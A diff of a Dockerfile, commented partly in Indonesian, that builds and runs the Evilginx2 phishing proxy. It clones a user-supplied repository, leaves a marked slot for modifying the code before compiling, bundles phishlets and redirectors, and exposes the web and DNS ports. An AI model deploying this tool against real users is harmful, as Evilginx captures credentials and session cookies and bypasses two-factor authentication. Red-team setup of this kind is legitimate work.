@@ -1,40 +1,55 @@
-# Base image dengan Go 1.22.3 di Alpine
-FROM golang:1.22.3-alpine AS build
+FROM alpine:latest AS build
+ARG PROJECT_DIR="/opt/go/src/evil/evilginx2"
 
-LABEL maintainer="froyo75@users.noreply.github.com"
+#put your repo here
+ARG REPO_URL=""
 
-# Argumen dan variabel lingkungan
-ARG GITHUB_USER="derainbow"
-ARG EVILGINX_REPOSITORY="github.com/${GITHUB_USER}/evilginx2"
-ENV PROJECT_DIR="/go/src/${EVILGINX_REPOSITORY}"
-ENV EVILGINX_BIN="/bin/evilginx"
+# Set environment variables
+ENV GOLANG_VERSION=1.22.3
+ENV PATH="/usr/local/go/bin:${PATH}"
 
 # Install dependencies
-RUN apk add --no-cache git make bash nano
+RUN apk add --no-cache wget tar bash git make nano \
+    && wget https://go.dev/dl/go${GOLANG_VERSION}.linux-amd64.tar.gz \
+    && tar -C /usr/local -xzf go${GOLANG_VERSION}.linux-amd64.tar.gz \
+    && rm go${GOLANG_VERSION}.linux-amd64.tar.gz
 
-# Clone repository
-RUN git clone https://${EVILGINX_REPOSITORY} ${PROJECT_DIR}
+# Verify Go installation
+RUN go version \
+    && mkdir -pv /opt/go/src/evil \
+    && git -C /opt/go/src/evil clone ${REPO_URL}
 
-# Build aplikasi Evilginx2
+###section untuk modifikasi kode evilginx sebelum di compile####
+
+###end section ################
+
+
+# Build EvilGinx2
 WORKDIR ${PROJECT_DIR}
-RUN go build -o ${EVILGINX_BIN}
+RUN set -x \
+    && go get -v \
+    && go build -v \
+    && make \
+    && mkdir -v /app \
+    && cp -vr phishlets /app \
+    && cp -vr redirectors /app \
+    && cp -v build/evilginx /bin/evilginx
 
-# Tahap 2 - Runtime Container
+
+# Stage 2 - Build Runtime Container
 FROM alpine:latest
-
-LABEL maintainer="froyo75@users.noreply.github.com"
-
 ENV EVILGINX_PORTS="443 80 53/udp"
-ENV EVILGINX_BIN="/bin/evilginx"
+ARG EVILGINX_BIN="/bin/evilginx"
 
-# Install bash untuk runtime
-RUN apk add --no-cache bash
 
-# Salin binary dan phishlets dari tahap build
-COPY --from=build ${EVILGINX_BIN} ${EVILGINX_BIN}
-COPY --from=build /go/src/${EVILGINX_REPOSITORY}/phishlets /app/phishlets
-
-# Konfigurasi runtime container
+RUN apk add --no-cache bash nano && mkdir -v /app
+# Install EvilGinx2
 WORKDIR /app
+COPY --from=build ${EVILGINX_BIN} .
+COPY --from=build /app .
+# Salin file blacklist.txt ke /root/.evilginx di dalam container
+COPY blacklist.txt /root/.evilginx/blacklist.txt
+
 EXPOSE ${EVILGINX_PORTS}
-CMD ["/bin/evilginx", "-p", "/app/phishlets"]
+
+CMD ["/app/evilginx", "-p", "/app/phishlets","-t","/app/redirectors", "-debug"]
